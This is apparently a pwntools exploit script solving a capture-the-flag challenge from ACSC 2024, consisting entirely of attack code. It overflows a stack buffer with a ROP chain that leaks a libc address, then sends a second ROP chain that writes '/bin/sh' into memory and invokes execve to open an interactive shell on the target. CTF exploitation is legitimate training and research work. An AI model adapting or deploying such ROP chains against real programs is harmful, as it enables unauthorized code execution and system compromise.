from pwn import *
import subprocess

if args.LOCAL:
    #io = process(["python3", "launch.py"])
    io = process('./prog_patched')
    if args.GDB:
        cmd = """
        """
        gdb.attach(io, cmd)
else:
    io = remote('fleeda.chal.2024.ctf.acsc.asia', 8109)
    #io = remote('0', 8109)

elf = ELF('./prog_patched')
libc = ELF('./libc.so.6')

## pow
if args.REMOTE:
    io.recvuntil(b'sha256(')
    prefix = io.recv(16)
    io.recvuntil(b'0000000(')
    diff = int(io.recv(2), 10)
    cmd = b"python3 pow.py " + prefix + b" " + str(diff).encode()
    print(cmd)
    exp = input().encode().strip(b'\n')
    io.sendlineafter(b'> ', exp)
    io.recvuntil(b'POW passed\n')

pop_rbx = 0x0000000000401091
pop_rbp = 0x000000000040116d
ret = 0x0000000000401016
add_nop_ret = 0x40116c
pl = b'A'*24
pl += p64(pop_rbx)
pl += p64(0x404008)
pl += p64(0x0000000000401083)
pl += p64(0)*3
pl += p64(0x401060)
pause()
io.sendline(pl)

io.recvline()
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym.setbuf

print(hex(libc.address))
pl = b'A'*24
pl += p64(libc.address + 0x000000000002a3e5)
pl += p64(0)
pl += p64(libc.address + 0x000000000002be51)
pl += p64(0x404f00)
pl += p64(libc.address + 0x000000000011f2e7)
pl += p64(0x20)*2
pl += p64(libc.sym.read)
pl += p64(libc.address+0x0000000000045eb0)
pl += p64(11)
pl += p64(libc.address + 0x0000000000035dd1)
pl += p64(0x404f00)
pl += p64(libc.address + 0x000000000003d1ee)
pl += p64(0)
pl += p64(libc.address + 0x000000000011f2e7)
pl += p64(0)*2
pl += p64(libc.address + 0x153ce2)

pause()
io.sendline(pl)

io.sendline(b'/bin/sh\0')

io.interactive()